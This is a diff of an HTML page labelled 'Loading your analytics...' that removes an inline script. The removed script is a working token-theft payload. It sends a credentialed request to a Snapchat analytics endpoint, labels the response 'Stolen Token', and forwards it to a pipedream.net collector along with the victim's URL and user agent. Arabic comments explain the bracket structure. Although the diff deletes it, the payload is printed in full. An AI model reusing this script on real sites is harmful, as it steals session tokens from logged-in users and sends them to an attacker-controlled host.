@@ -6,38 +6,5 @@
 <body>
     <h1>Loading your analytics...</h1>
 
-  <script>
-        fetch('https://us-central1-gcp.api.snapchat.com/web-analytics/web/init_client', {
-            method: 'POST',
-            credentials: 'include',
-            headers: {
-                'Origin': 'https://github.snappublisher.snapchat.com',
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({})
-        })
-        .then(response => response.json())
-        .then(data => {
-            console.log("Stolen Token:", data);
-            
-            // بداية fetch الثانية
-            fetch('https://eofg26yngr9vk6x.m.pipedream.net', {
-                method: 'POST',
-                mode: 'no-cors',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    stolen_token: data,
-                    victim_url: window.location.href,
-                    user_agent: navigator.userAgent,
-                    timestamp: new Date().toISOString()
-                })
-            }); // نهاية fetch الثانية
-            // لا توجد } زائدة هنا
-          
-        }) // هذه تغلق then الثانية
-        .catch(error => console.error('Error:', error));
-</script>
 </body>
 </html>
